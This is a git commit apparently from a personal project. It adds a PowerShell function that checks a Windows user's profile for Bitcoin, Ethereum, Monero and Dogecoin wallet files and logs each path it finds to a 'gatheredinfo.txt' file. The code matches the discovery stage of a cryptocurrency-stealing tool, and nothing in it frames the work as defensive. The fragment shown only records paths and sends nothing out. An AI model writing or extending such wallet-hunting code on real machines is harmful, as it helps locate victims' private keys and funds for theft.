08324ee99dd3b383a3e2efa890c1af1d1bdb51bc
Gele Hasan <111875403+gelehasan@users.noreply.github.com>
2024-12-05 21:06:39 +0100

    function that finds wallets

--- findWallets.ps1
+++ findWallets.ps1
@@ -1,1 +1,12 @@
+$gatheredInfo= "gatheredinfo.txt"
+function  searchforWallets{
+    $walletpath = @("$env:USERPROFILE\.bitcoin\wallet.dat", "$env:USERPROFILE\.ethereum\keystore\*",
+    "$env:USERPROFILE\.monero\wallet", "$env:USERPROFILE\.dogecoin\wallet.dat")
 
+    Add-Content -Path $gatheredInfo -Value "`n### Wallet files ###"
+    foreach($path in $walletpath){
+        if(Test-Path $path){
+            Add-Content -Path $gatheredInfo -Value "Found wallet: $path"
+        }
+    }
+}
